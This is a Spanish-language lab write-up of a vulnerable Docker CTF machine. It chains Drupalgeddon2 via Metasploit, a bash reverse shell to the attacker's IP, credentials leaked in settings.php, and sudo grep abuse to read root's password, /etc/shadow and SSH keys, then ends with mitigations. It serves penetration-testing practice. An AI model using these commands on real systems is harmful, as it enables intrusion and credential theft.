# FindYourStyle
Laboratorio para practicar la explotación de Drupal (Drupalgeddon2) para obtener acceso y escalar privilegios en Linux.
# 🐳 Find your own Style — Writeup

Máquina vulnerable estilo **DockerLabs** / CTF. Vulnerabilidad web en **Drupal 8** (Drupalgeddon2) que lleva a RCE, pivote a usuario del sistema por credenciales reutilizadas y escalada a root abusando de `sudo` sobre binarios GTFOBins.

| | |
|---|---|
| **Dificultad** | Fácil / Media |
| **Técnicas** | Drupalgeddon2 (CVE-2018-7600) · Shell stabilization (TTY) · Reutilización de credenciales · Sudo GTFOBins (`grep`) |
| **Objetivo (víctima)** | `172.17.0.2` |
| **Atacante (Kali)** | `10.0.2.15` |

---

## 📑 Índice

1. [Reconocimiento](#1-reconocimiento)
2. [Enumeración web](#2-enumeración-web)
3. [Explotación — Drupalgeddon2](#3-explotación--drupalgeddon2-cve-2018-7600)
4. [Fuga de credenciales (settings.php)](#4-fuga-de-credenciales-settingsphp)
5. [Estabilización de la shell (TTY)](#5-estabilización-de-la-shell-tty)
6. [Movimiento lateral → ballenita](#6-movimiento-lateral--ballenita)
7. [Escalada de privilegios → root](#7-escalada-de-privilegios--root)
8. [Resumen de la cadena](#8-resumen-de-la-cadena-de-ataque)
9. [Lecciones aprendidas](#9-lecciones-aprendidas)

---

## 1. Reconocimiento

Escaneo completo de puertos con Nmap:

```bash
sudo nmap -p- -sS -sC -sV -vvv -T5 -Pn -n 172.17.0.2
```

Resultado relevante — un único puerto abierto:

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-generator: Drupal 8 (https://www.drupal.org)
|_http-title: Welcome to Find your own Style | Find your own Style
|_http-server-header: Apache/2.4.25 (Debian)
```

Solo hay **HTTP (80)** corriendo **Apache 2.4.25** sobre **Drupal 8**.

---

## 2. Enumeración web

Confirmamos el stack con `whatweb`:

```bash
whatweb http://172.17.0.2/
```

```
Drupal, HTTPServer[Debian Linux][Apache/2.4.25 (Debian)],
MetaGenerator[Drupal 8], PHP[7.2.3], X-Powered-By[PHP/7.2.3]
```

- **CMS:** Drupal 8
- **PHP:** 7.2.3
- **Apache:** 2.4.25 (Debian)

Drupal 8 sin parchear es candidato directo a **Drupalgeddon2 (CVE-2018-7600)**, un fallo de *Forms API Property Injection* que permite ejecución remota de código sin autenticación.

![Portal Drupal](images/02-drupal-login.png)

---

## 3. Explotación — Drupalgeddon2 (CVE-2018-7600)

Usamos el módulo de Metasploit:

```bash
msfconsole
search CVE-2018-7600
use exploit/unix/webapp/drupal_drupalgeddon2
set RHOSTS 172.17.0.2
set LHOST 10.0.2.15          # ← tu IP de atacante
run
```

```
[+] The target is vulnerable. Detected vulnerable version 8
[*] Sending stage (72682 bytes) to 172.17.0.2
[*] Meterpreter session 1 opened (10.0.2.15:4444 -> 172.17.0.2) ...

meterpreter > shell
whoami
www-data
```

Tenemos **RCE como `www-data`**.

---

## 4. Fuga de credenciales (settings.php)

Localizamos el fichero de configuración de Drupal:

```bash
find / -name settings.php 2>/dev/null
cat /var/www/html/sites/default/settings.php
```

En el bloque de ejemplo de la base de datos aparecen credenciales (con comentarios del propio sysadmin 👀):

```php
'database' => 'database_under_beta_testing', // ... petó la base de datos jiji xd
'username' => 'ballenita',
'password' => 'ballenitafeliz',              // Cuidadito cuidadín pillin
```

> 💡 Aunque la BBDD real es SQLite (`.ht.sqlite`), el usuario y contraseña del bloque de ejemplo **están reutilizados para un usuario del sistema** (`ballenita`). Las credenciales filtradas en código casi siempre merece la pena probarlas contra SSH, `su` y paneles de login.

---

## 5. Estabilización de la shell (TTY)

Intentar cambiar de usuario desde la shell de Meterpreter falla:

```bash
su ballenita
# su: must be run from a terminal
sudo -l
# sudo: no tty present and no askpass program specified
```

`su` y `sudo` necesitan un **TTY real** para pedir la contraseña. La pseudo-shell del canal `shell` de Meterpreter no lo es (y además es inestable: al forzar un PTY, la sesión se muere).

![Shell sin TTY](images/01-shell-tty-problema.png)

En esta máquina **no hay Python** (`python3: not found`, `python: not found`), así que la vía limpia es **cazar una reverse shell en netcat y estabilizarla con `script`**.

> ⚠️ **Error típico (y el que más tiempo me costó):** la reverse shell hay que apuntarla a la **IP del atacante** (`10.0.2.15`), **no** a la de la víctima (`172.17.0.2`) ni al gateway de Docker (`172.17.0.1`). Apuntar a la propia víctima da siempre `Connection refused`.

**En Kali — listener:**

```bash
nc -lvnp 5555
```

**En la víctima (desde el `shell` de Meterpreter):**

```bash
bash -c 'bash -i >& /dev/tcp/10.0.2.15/5555 0>&1'
```

**Ya en la shell de netcat — upgrade a TTY (sin Python):**

```bash
script -qc /bin/bash /dev/null
```

Opcionalmente, TTY completo (flechas, Ctrl+C, autocompletado):

```bash
# Ctrl+Z para pausar
stty raw -echo; fg
# pulsar Enter un par de veces
export TERM=xterm
```

---

## 6. Movimiento lateral → ballenita

Con TTY de verdad ya podemos usar las credenciales filtradas:

```bash
su ballenita
# Password: ballenitafeliz

ballenita@35592296e81b:/var/www/html$ id
```

Somos **`ballenita`**. ✅

---

## 7. Escalada de privilegios → root

Revisamos permisos de sudo:

```bash
sudo -l
```

```
User ballenita may run the following commands on 35592296e81b:
    (root) NOPASSWD: /bin/ls, /bin/grep
```

`ballenita` puede ejecutar **`/bin/ls` y `/bin/grep` como root y sin contraseña**. Ambos son explotables vía [GTFOBins](https://gtfobins.github.io/). `grep` es la joya porque permite **leer cualquier fichero como root**:

```bash
# enumerar el home de root
sudo ls -la /root/
```

```
-rw-r--r-- 1 root root  35 Oct 16  2024 secretitomaximo.txt
```

```bash
# leer el fichero como root (patrón vacío = todas las líneas)
sudo grep '' /root/secretitomaximo.txt
```

```
nobodycanfindthispasswordrootrocks
```

Ese fichero contiene la **contraseña de root**. Como ya tenemos TTY, usamos `su` normal:

```bash
su root
# Password: nobodycanfindthispasswordrootrocks

root@35592296e81b:/var/www/html# id
uid=0(root) gid=0(root) groups=0(root)
```

**ROOT conseguido.** 🏴‍☠️

> 📌 Nota: `ballenita` no podía hacer `sudo su` (`not allowed to execute '/bin/su' as root`). El truco no era ejecutar `su` *vía sudo*, sino **usar `sudo grep` para leer la contraseña** y luego un `su root` normal.

### Vías alternativas de root con `sudo grep`

El mismo primitivo de lectura arbitraria sirve para otras rutas:

```bash
sudo grep '' /etc/shadow            # hash de root → john/hashcat
sudo grep '' /root/.ssh/id_rsa      # clave privada → ssh -i id_rsa root@...
```

---

## 8. Resumen de la cadena de ataque

```
nmap (80/tcp, Drupal 8)
        │
        ▼
Drupalgeddon2 (CVE-2018-7600)  ──►  RCE como www-data
        │
        ▼
settings.php  ──►  credenciales filtradas (ballenita:ballenitafeliz)
        │
        ▼
reverse shell a 10.0.2.15 + script (TTY)
        │
        ▼
su ballenita  ──►  credenciales reutilizadas
        │
        ▼
sudo -l: NOPASSWD /bin/grep  ──►  GTFOBins: lectura arbitraria como root
        │
        ▼
sudo grep '' /root/secretitomaximo.txt  ──►  password de root
        │
        ▼
su root  ──►  🏆 ROOT
```

---

## 9. Lecciones aprendidas

- **Credenciales en código = oro.** Siempre revisar `settings.php`, `.env`, `wp-config.php`, etc. y probar las credenciales filtradas en SSH, `su` y paneles de login aunque sean de la BBDD.
- **Reverse shell a la IP correcta.** Apunta siempre a la IP del **atacante**, no a la de la víctima. Confírmala con el handler de Metasploit (`-> 172.17.0.2:xxxxx` significa que la víctima alcanza tu `LHOST`).
- **Estabilizar shells sin Python.** Si no hay `python`/`python3`, recurre a `script -qc /bin/bash /dev/null`, `socat`, `expect` o `perl`.
- **`sudo -l` siempre.** Un binario aparentemente inofensivo como `grep` o `ls` con NOPASSWD suele ser escalada directa — consúltalo en **GTFOBins**.

---

### Mitigaciones

- Actualizar Drupal a una versión parcheada (CVE-2018-7600 corregido en 7.58 / 8.5.1).
- No dejar credenciales reales ni de ejemplo reutilizadas en `settings.php`.
- No conceder `NOPASSWD` sobre binarios que permiten lectura/escritura arbitraria (`grep`, `ls`, `find`, `vi`...).

---

